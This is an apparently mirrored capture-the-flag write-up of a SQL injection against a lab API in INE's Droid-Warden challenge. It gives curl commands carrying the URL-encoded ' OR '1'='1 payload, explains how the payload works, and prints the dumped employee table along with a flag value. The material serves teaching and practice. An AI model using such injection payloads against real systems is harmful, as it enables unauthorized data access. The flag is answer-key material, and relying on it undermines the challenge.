# :game_die: Droid-Warden CTF by INE : How I Finished First Under Pressure

> **Original Source:** [Droid-Warden CTF by INE : How I Finished First Under Pressure](https://infosecwriteups.com/droid-warden-ctf-by-ine-how-i-finished-first-under-pressure-6caad8b21155)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## Exploiting SQL Injection


>

Reproducing a normal request (baseline test)


### Baseline request


```
curl -H "Authorization: Bearer $token" \
"http://nexusconnect.ine.local/api/v1/nexusconnect/search-employee?name=a"
```


>

Why this matters


Confirms:


- Token works

- Endpoint is reachable

- Response format is JSON

- Establishes expected behavior before exploitation


This is important for controlled testing, not blind injection.

## SQL Injection test payload


```
curl -H "Authorization: Bearer $token" \
"http://nexusconnect.ine.local/api/v1/nexusconnect/search-employee?name=%27%20OR%20%271%27%3D%271"
```


### Why this payload?


Decoded version:


```
' OR '1'='1
```


- `'` → closes original SQL string

- `OR '1'='1'` → always true

- `%27`, `%20`, `%3D` → URL encoding to avoid parsing errors

>

What the output proves


- Entire employee table returned

>

*Confirms :*


- *SQL injection*

- *No prepared statements*

- *No server-side validation*

>

Expected Output :


```
student@a93b14167e48ece32c8470:~/Desktop/Tools$ curl -H "Authorization: Bearer $token" \
"http://nexusconnect.ine.local/api/v1/nexusconnect/search-employee?name=%27%20OR%20%271%27%3D%271"
[
{
"department": "IT",
"designation": "Junior Developer",
"id": 1,
"name": "Alice Johnson"
},
{
"department": "Finance",
"designation": "Accounts Assistant",
"id": 2,
"name": "Bob Smith"
},
{
"department": "HR",
"designation": "HR Coordinator",
"id": 3,
"name": "Carla Gomez"
},
{
"department": "IT",
"designation": "Security Analyst",
"id": 4,
"name": "Daniel Kim"
},
{
"department": "Logistics",
"designation": "Warehouse Supervisor",
"id": 5,
"name": "Eva Singh"
},
{
"department": "Marketing",
"designation": "Digital Strategist",
"id": 6,
"name": "Fahad Ali"
},
{
"department": "Customer Support",
"designation": "Escalation Specialist",
"id": 7,
"name": "Grace Lee"
},
{
"department": "Research",
"designation": "Lab Technician",
"id": 8,
"name": "Hassan Abbas"
},
{
"department": "HR",
"designation": "Senior HR Associate",
"flag": "FLAG3_b26667649bd7a781d70988f59debc559",
"id": 9,
"name": "Irene Thomas"
},
{
"department": "Operations",
"designation": "Shift Manager",
"id": 10,
"name": "James Parker"
},
{
"department": "Executive",
"designation": "System Administrator",
"id": 11,
"name": "John Nova"
}
]
```


```
Flag-3: b26667649bd7a781d70988f59debc559
```

---

*Originally published on [Medium](https://infosecwriteups.com/droid-warden-ctf-by-ine-how-i-finished-first-under-pressure-6caad8b21155). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
